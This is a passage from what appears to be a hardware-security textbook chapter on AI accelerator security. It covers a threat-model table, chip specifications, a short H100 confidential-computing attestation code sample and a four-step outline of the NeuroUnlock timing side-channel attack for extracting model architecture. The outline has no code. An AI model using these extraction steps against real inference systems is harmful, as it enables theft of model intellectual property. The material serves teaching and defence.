+  <a href="#3452-model-inversion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.5.2 Model Inversion
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-backdoor-trojan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.6 Backdoor and Trojan Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.6 Backdoor and Trojan Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3461-software-backdoor-badnets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.6.1 Software Backdoor (BadNets)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3462-hardware-trojan-in-ai-asic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.6.2 Hardware Trojan in AI ASIC
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-model-file-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.7 Model File Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.7 Model File Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3471-pytorch-pickle-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.7.1 PyTorch pickle Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3472-aes-256-gcm-model-encryption" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.7.2 AES-256-GCM Model Encryption
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-federated-learning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.8 Federated Learning Hardware Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.8 Federated Learning Hardware Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3481-gradient-inversion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.8.1 Gradient Inversion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3482-dp-sgd-defence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.8.2 DP-SGD Defence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3483-byzantine-robust-aggregation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.8.3 Byzantine-Robust Aggregation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-tee-ai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.9 Trusted Execution for AI Workloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-nn-watermark" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.10 Neural Network Watermarking
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-fpga" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.11 FPGA Implementation for AI Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-asic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.12 ASIC Implementation Comparison
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-solutions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.13 Commercial and Open-Source Solutions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-solved" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.14 Solved Problems
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-standards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.15 Standards
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ch34-recent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16 Recent Developments (2024–2026)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.16 Recent Developments (2024–2026)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#34161-nvidia-h200-hbm3e-encrypted-memory-and-updated-confidential-computing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.1 NVIDIA H200 — HBM3e Encrypted Memory and Updated Confidential Computing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34162-amd-mi300x-sev-snp-integration-for-confidential-ai-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.2 AMD MI300X — SEV-SNP Integration for Confidential AI (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34163-intel-gaudi-3-security-architecture-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.3 Intel Gaudi 3 — Security Architecture (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34164-eu-ai-act-hardware-requirements-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.4 EU AI Act Hardware Requirements (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34165-llm-model-extraction-attacks-on-inference-hardware-20232024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.5 LLM Model Extraction Attacks on Inference Hardware (2023–2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34166-groq-lpu-deterministic-execution-and-side-channel-implications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.6 Groq LPU — Deterministic Execution and Side-Channel Implications
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34167-apple-m3-gpu-side-channel-leftoverlocals-cve-2023-4969" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.7 Apple M3 GPU Side-Channel — LeftoverLocals (CVE-2023-4969)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-exercises" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.17 Exercises
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch35-usb-and-thunderbolt-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    35. USB and Thunderbolt Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch36-wireless-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    36. Wireless Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch37-confidential-computing-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    37. Confidential Computing Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch38-hardware-security-design-flow-and-eda-tools.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    38. Hardware Security Design Flow and EDA Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch39-chiplet-and-heterogeneous-integration-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    39. Chiplet and Heterogeneous Integration Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="key-standards-reference.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Key Standards Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="security-tools-reference.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Tools Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="further-reading.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Further Reading
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-threat-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.1 AI Hardware Threat Model
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-chip-landscape" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2 AI Chip Landscape
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.2 AI Chip Landscape">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3421-nvidia-h100-sxm5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2.1 NVIDIA H100 SXM5
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3422-google-tpu-v4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2.2 Google TPU v4
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3423-aws-trainium2-and-inferentia2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2.3 AWS Trainium2 and Inferentia2
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3424-cerebras-wse-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2.4 Cerebras WSE-3
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-h100-cc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.3 NVIDIA H100 Confidential Computing Architecture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.3 NVIDIA H100 Confidential Computing Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3431-h100-confidential-computing-technical-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.3.1 H100 Confidential Computing Technical Details
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-weight-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.4 Model Weight Extraction Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.4 Model Weight Extraction Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3441-timing-side-channel-on-npu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.4.1 Timing Side-Channel on NPU
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3442-power-analysis-on-npu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.4.2 Power Analysis on NPU
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-membership-inference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.5 Membership Inference and Model Inversion
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.5 Membership Inference and Model Inversion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3451-membership-inference-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.5.1 Membership Inference Attacks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3452-model-inversion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.5.2 Model Inversion
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-backdoor-trojan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.6 Backdoor and Trojan Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.6 Backdoor and Trojan Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3461-software-backdoor-badnets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.6.1 Software Backdoor (BadNets)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3462-hardware-trojan-in-ai-asic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.6.2 Hardware Trojan in AI ASIC
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-model-file-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.7 Model File Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.7 Model File Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3471-pytorch-pickle-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.7.1 PyTorch pickle Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3472-aes-256-gcm-model-encryption" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.7.2 AES-256-GCM Model Encryption
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-federated-learning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.8 Federated Learning Hardware Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.8 Federated Learning Hardware Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3481-gradient-inversion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.8.1 Gradient Inversion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3482-dp-sgd-defence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.8.2 DP-SGD Defence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3483-byzantine-robust-aggregation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.8.3 Byzantine-Robust Aggregation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-tee-ai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.9 Trusted Execution for AI Workloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-nn-watermark" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.10 Neural Network Watermarking
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-fpga" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.11 FPGA Implementation for AI Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-asic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.12 ASIC Implementation Comparison
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-solutions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.13 Commercial and Open-Source Solutions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-solved" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.14 Solved Problems
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-standards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.15 Standards
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ch34-recent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16 Recent Developments (2024–2026)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.16 Recent Developments (2024–2026)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#34161-nvidia-h200-hbm3e-encrypted-memory-and-updated-confidential-computing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.1 NVIDIA H200 — HBM3e Encrypted Memory and Updated Confidential Computing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34162-amd-mi300x-sev-snp-integration-for-confidential-ai-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.2 AMD MI300X — SEV-SNP Integration for Confidential AI (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34163-intel-gaudi-3-security-architecture-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.3 Intel Gaudi 3 — Security Architecture (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34164-eu-ai-act-hardware-requirements-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.4 EU AI Act Hardware Requirements (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34165-llm-model-extraction-attacks-on-inference-hardware-20232024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.5 LLM Model Extraction Attacks on Inference Hardware (2023–2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34166-groq-lpu-deterministic-execution-and-side-channel-implications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.6 Groq LPU — Deterministic Execution and Side-Channel Implications
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34167-apple-m3-gpu-side-channel-leftoverlocals-cve-2023-4969" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.16.7 Apple M3 GPU Side-Channel — LeftoverLocals (CVE-2023-4969)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-exercises" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.17 Exercises
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ch-ai-hardware-security">Chapter 34: AI and ML Hardware Security<a class="headerlink" href="#ch-ai-hardware-security" title="Permanent link">&para;</a></h1>
+<p>The integration of AI accelerators into data centres, edge devices, and safety-critical systems creates an entirely new hardware security attack surface. Model weights represent billions of dollars of intellectual property; training pipelines handle sensitive data at scale; inference systems can be manipulated by adversarial inputs or hardware trojans. This chapter covers the threat model, hardware architectures, attack techniques, and defences for the full AI hardware stack – from trillion-parameter models on wafer-scale silicon through privacy-preserving federated learning.</p>
+<h2 id="sec-ai-threat-model"><span class="secnum">34.1</span> AI Hardware Threat Model<a class="headerlink" href="#sec-ai-threat-model" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-ai-threats">
+<div class="tbl-caption"><strong>Table 34.1.</strong> AI hardware threat model: assets, threats, and mitigations.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Asset</strong></th>
+<th style="text-align: left;"><strong>Threat Actor</strong></th>
+<th style="text-align: left;"><strong>Attack Vector</strong></th>
+<th style="text-align: left;"><strong>Mitigation</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Model weights (IP)</td>
+<td style="text-align: left;">Competitor, insider</td>
+<td style="text-align: left;">Weight extraction, side-channel</td>
+<td style="text-align: left;">AES-256-GCM encryption, CC</td>
+</tr>
+<tr>
+<td style="text-align: left;">Training data (privacy)</td>
+<td style="text-align: left;">Attacker, regulator</td>
+<td style="text-align: left;">Membership inference, inversion</td>
+<td style="text-align: left;">DP-SGD, data anonymisation</td>
+</tr>
+<tr>
+<td style="text-align: left;">Inference result</td>
+<td style="text-align: left;">Adversary</td>
+<td style="text-align: left;">Adversarial example, evasion</td>
+<td style="text-align: left;">Randomised smoothing, sensor fusion</td>
+</tr>
+<tr>
+<td style="text-align: left;">AI ASIC / NPU</td>
+<td style="text-align: left;">Supply chain, nation</td>
+<td style="text-align: left;">Hardware Trojan insertion</td>
+<td style="text-align: left;">ATPG, logic encryption</td>
+</tr>
+<tr>
+<td style="text-align: left;">Model file (deployment)</td>
+<td style="text-align: left;">Malware, supply chain</td>
+<td style="text-align: left;">Backdoor in model file</td>
+<td style="text-align: left;">Safetensors, cryptographic hash</td>
+</tr>
+<tr>
+<td style="text-align: left;">Gradient (FL)</td>
+<td style="text-align: left;">Participant, server</td>
+<td style="text-align: left;">Gradient inversion, poisoning</td>
+<td style="text-align: left;">DP-SGD, secure aggregation</td>
+</tr>
+<tr>
+<td style="text-align: left;">Hyperparameters</td>
+<td style="text-align: left;">Insider, side-channel</td>
+<td style="text-align: left;">Config extraction</td>
+<td style="text-align: left;">TEE-isolated training</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-ai-chip-landscape"><span class="secnum">34.2</span> AI Chip Landscape<a class="headerlink" href="#sec-ai-chip-landscape" title="Permanent link">&para;</a></h2>
+<h3 id="3421-nvidia-h100-sxm5"><span class="secnum">34.2.1</span> NVIDIA H100 SXM5<a class="headerlink" href="#3421-nvidia-h100-sxm5" title="Permanent link">&para;</a></h3>
+<p>NVIDIA H100 (Hopper architecture, 2022):</p>
+<ul>
+<li>
+<p>Process: TSMC 4 nm N4 FinFET</p>
+</li>
+<li>
+<p>Die size: 814 mm<span class="arithmatex">\(^2\)</span>, 80 billion transistors</p>
+</li>
+<li>
+<p>HBM3: 80 GB, 3.35 TB/s bandwidth, 5-stack HBM3</p>
+</li>
+<li>
+<p>TDP: 700 W (SXM5 form factor), 400 W (PCIe)</p>
+</li>
+<li>
+<p>Tensor Cores: 4th generation, FP8 / BF16 / FP16 / TF32 / FP64</p>
+</li>
+<li>
+<p>Performance: 3958 TFLOPS (FP8 sparse), 1979 TFLOPS (FP8 dense)</p>
+</li>
+<li>
+<p>Security: H100 Confidential Computing (CC), AES-XTS 256-bit memory encryption, remote attestation via RIM (Reference Integrity Manifest), TEE-I/O for secure PCIe DMA between H100 and Intel TDX / AMD SEV-SNP VMs</p>
+</li>
+</ul>
+<h3 id="3422-google-tpu-v4"><span class="secnum">34.2.2</span> Google TPU v4<a class="headerlink" href="#3422-google-tpu-v4" title="Permanent link">&para;</a></h3>
+<p>Google TPU v4 (2021, production 2022):</p>
+<ul>
+<li>
+<p>Process: TSMC 7 nm FinFET</p>
+</li>
+<li>
+<p>32 GB HBM2e per chip, 1.2 TB/s bandwidth</p>
+</li>
+<li>
+<p>Optical interconnect: 2D torus topology using optical circuit switches for inter-pod communication (4096 chips per pod)</p>
+</li>
+<li>
+<p>MXU (Matrix Multiply Unit): systolic array, BF16 multiply, FP32 accumulate</p>
+</li>
+<li>
+<p>Performance: 275 TFLOPS (BF16)</p>
+</li>
+<li>
+<p>Security: Google-managed keys, no user-accessible confidential computing mode</p>
+</li>
+</ul>
+<h3 id="3423-aws-trainium2-and-inferentia2"><span class="secnum">34.2.3</span> AWS Trainium2 and Inferentia2<a class="headerlink" href="#3423-aws-trainium2-and-inferentia2" title="Permanent link">&para;</a></h3>
+<p>AWS Trainium2 (Annapurna Labs, 2023):</p>
+<ul>
+<li>
+<p>Process: TSMC 7 nm, 16 NeuronCore-v2 per chip</p>
+</li>
+<li>
+<p>Memory: 96 GB HBM2e per chip (up to 16 chips per Trn2 instance)</p>
+</li>
+<li>
+<p>Performance: 3.4 PFLOPS (BF16 per Trn2 UltraServer with 16 chips)</p>
+</li>
+<li>
+<p>Security: AWS Nitro enclaves for model isolation, NeuronSDK encryption</p>
+</li>
+</ul>
+<h3 id="3424-cerebras-wse-3"><span class="secnum">34.2.4</span> Cerebras WSE-3<a class="headerlink" href="#3424-cerebras-wse-3" title="Permanent link">&para;</a></h3>
+<p>Cerebras Wafer-Scale Engine 3 (WSE-3, 2023):</p>
+<ul>
+<li>
+<p>Process: TSMC 5 nm</p>
+</li>
+<li>
+<p>Die size: Full 300 mm wafer, 4 trillion transistors (900 billion active), 900,000 AI cores, 44 GB on-chip SRAM (no HBM)</p>
+</li>
+<li>
+<p>Performance: 125 PFLOPS (FP16), eliminating memory bottleneck by keeping all weights on-chip for models up to 20 billion parameters</p>
+</li>
+<li>
+<p>Security: physical colocality required (all weights on-chip), no PCIe DMA attack surface for weight extraction</p>
+</li>
+</ul>
+<h2 id="sec-h100-cc"><span class="secnum">34.3</span> NVIDIA H100 Confidential Computing Architecture<a class="headerlink" href="#sec-h100-cc" title="Permanent link">&para;</a></h2>
+<figure class="fig fig-diagram" id="fig-h100-cc">
+<img class="tikz" src="img/tikz-861d93c99aaa.svg" alt="NVIDIA H100 Confidential Computing: CPU TDX trust domain communicates with H100 via TEE-I/O over PCIe 5.0; HBM3 memory is AES-XTS-256 encrypted; the hypervisor and host OS cannot access model weights…" loading="lazy">
+<figcaption><strong>Figure 34.1.</strong> NVIDIA H100 Confidential Computing: CPU TDX trust domain communicates with H100 via TEE-I/O over PCIe 5.0; HBM3 memory is AES-XTS-256 encrypted; the hypervisor and host OS cannot access model weights or activations.</figcaption>
+</figure>
+
+<h3 id="3431-h100-confidential-computing-technical-details"><span class="secnum">34.3.1</span> H100 Confidential Computing Technical Details<a class="headerlink" href="#3431-h100-confidential-computing-technical-details" title="Permanent link">&para;</a></h3>
+<p>AES-XTS-256 memory encryption: each HBM3 channel has an independent AES-XTS engine; the encryption key is generated inside the H100 HSE (Hardware Security Engine) at boot using the on-chip TRNG and is never exposed to host software. The key is unique per GPU, per boot session.</p>
+<p>Remote Attestation flow:</p>
+<ol>
+<li>
+<p>H100 generates an attestation report including: GPU firmware hash, driver hash, model hash (if CC mode active), and VBIOS hash.</p>
+</li>
+<li>
+<p>Report is signed with the GPU’s device key (ECDSA P-384), certificate chain rooted to NVIDIA’s CA.</p>
+</li>
+<li>
+<p>Relying party (VM or cloud customer) verifies signature against NVIDIA’s published RIM (Reference Integrity Manifest).</p>
+</li>
+<li>
+<p>On verified attestation, the relying party sends encrypted model weights; H100 decrypts inside the CC TEE.</p>
+</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code># H100 CC attestation using NVIDIA NVML / SDK
+import nv_attestation_sdk as nvat
+
+# Step 1: Request attestation report from GPU
+report = nvat.get_gpu_attestation_report(gpu_index=0)
+
+# Step 2: Verify against NVIDIA RIM service
+verifier = nvat.LocalVerifier(rim_url="https://rim.attestation.nvidia.com")
+result = verifier.verify(report)
+
+if result.status == nvat.PASS:
+    # Step 3: Encrypted model delivery
+    encrypted_model = encrypt_model_for_gpu(model_path, result.gpu_pub_key)
+    send_to_gpu(encrypted_model)
+</code></pre></div>
+<h2 id="sec-weight-extraction"><span class="secnum">34.4</span> Model Weight Extraction Attacks<a class="headerlink" href="#sec-weight-extraction" title="Permanent link">&para;</a></h2>
+<h3 id="3441-timing-side-channel-on-npu"><span class="secnum">34.4.1</span> Timing Side-Channel on NPU<a class="headerlink" href="#3441-timing-side-channel-on-npu" title="Permanent link">&para;</a></h3>
+<p>NeuroUnlock (2023): timing side-channel attack on Neural Processing Units. Layer-by-layer timing profiling reveals model architecture: different layer types (conv2d, attention, linear) have distinct execution time signatures on NPU schedulers. Once architecture is identified, parameter counts can be estimated from memory access timing variations correlated with weight tensor shapes.</p>
+<p>Attack methodology:</p>
+<ol>
+<li>
+<p>Send crafted input batches and measure inference latency at microsecond granularity using hardware performance counters</p>
+</li>
+<li>
+<p>Cluster timing profiles to identify layer boundaries</p>
+</li>
+<li>
+<p>Reconstruct approximate architecture (number of layers, hidden dimensions)</p>
+</li>
+<li>
+<p>Use knowledge distillation: train a surrogate model using the victim model as a black-box oracle</p>
+</li>
+</ol>
+<h3 id="3442-power-analysis-on-npu"><span class="secnum">34.4.2</span> Power Analysis on NPU<a class="headerlink" href="#3442-power-analysis-on-npu" title="Permanent link">&para;</a></h3>
